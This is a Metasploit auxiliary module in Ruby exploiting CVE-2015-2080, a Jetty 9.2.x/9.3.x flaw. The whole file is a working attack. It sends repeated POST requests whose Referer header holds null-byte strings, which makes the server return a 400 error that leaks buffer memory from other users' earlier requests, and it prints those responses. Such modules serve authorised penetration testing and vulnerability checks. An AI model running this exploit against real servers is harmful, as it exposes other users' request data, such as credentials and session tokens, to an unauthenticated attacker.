##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Remote Leakage Of Shared Buffers In Jetty Web Server [CVE-2015-2080]",
      'Description'    => %q{
        This module exploits a vulnerability found in Jetty Web Server
        versions 9.2.x and 9.3.x, which allows an unauthenticated remote attacker to read arbitrary data from previous requests submitted to the server by other users.
      },
      'Author'         =>
        [
          'Gotham Digital Science', # Discovery
	  'Tiago Balgan Henriques' # Metasploit Module
        ],
      'References'     =>
        [
          [ 'CVE', '2015-2080' ]
        ],
      'Privileged'     => false,
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 0x31337,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl telnet',
            }
        },
      'Targets'        =>
        [
          ['Automatic', {}]
        ],
      'DefaultTarget'  => 0,
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Feb, 25 2015'
    ))

    register_options(
      [
        Opt::RPORT(8080),
	OptInt.new('LOOP', [ true, 'Number of times you want to try and exploit', 60 ]),
	OptString.new('url', [ true, 'url to test', "test-spec/test" ])
      ], self.class)
  end


        def run
        for i in 0..datastore['LOOP']
            	uri = target_uri.path
		badstring = "/\x00/"*44
	        res = send_request_cgi({
	             'method'   => 'POST',
	             'uri'      => datastore['url'],
		     'headers' => {"Referer" => badstring }
	            }) 
       	    if res && res.code == 400
                print_good("I got a 400, awesome")
		puts(res)
            else
                print_error("No 400, server might not be vulnerable")
		puts(res)
	   end
      end
  end
end 
